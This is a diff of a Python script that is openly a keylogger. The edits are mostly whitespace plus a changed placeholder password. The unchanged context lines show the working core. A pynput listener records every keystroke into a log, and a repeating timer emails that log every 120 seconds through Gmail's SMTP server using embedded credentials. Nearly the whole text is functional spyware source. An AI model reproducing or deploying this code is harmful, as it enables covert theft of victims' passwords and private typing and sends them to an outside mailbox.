@@ -11,8 +11,10 @@ class Keylogger:
       self.email = email
       self.password = password
       
+      
    def append_to_log(self, string):
       self.log += string
+            
             
    def process_key_press(self, key):
       try:
@@ -26,11 +28,13 @@ class Keylogger:
             current_key = f" {str(key)} "
       self.append_to_log(current_key)
 
+
    def report(self):
       self.send_email(self.email, self.password, "\n\n" + self.log)
       self.log = ""
       timer = threading.Timer(self.interval, self.report)
       timer.start()
+      
       
    def send_email(self, email, password, message):
       server = smtplib.SMTP("smtp.gmail.com", 587)
@@ -39,6 +43,7 @@ class Keylogger:
       server.sendmail(email, email, message)
       server.quit()
 
+
    def start(self):
       keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key_press)
       with keyboard_listener:
@@ -46,5 +51,5 @@ class Keylogger:
          keyboard_listener.join()
 
 
-my_keylogger = Keylogger(120, "your-email", "your-password")
+my_keylogger = Keylogger(120, "your-email", "email-password")
 my_keylogger.start()
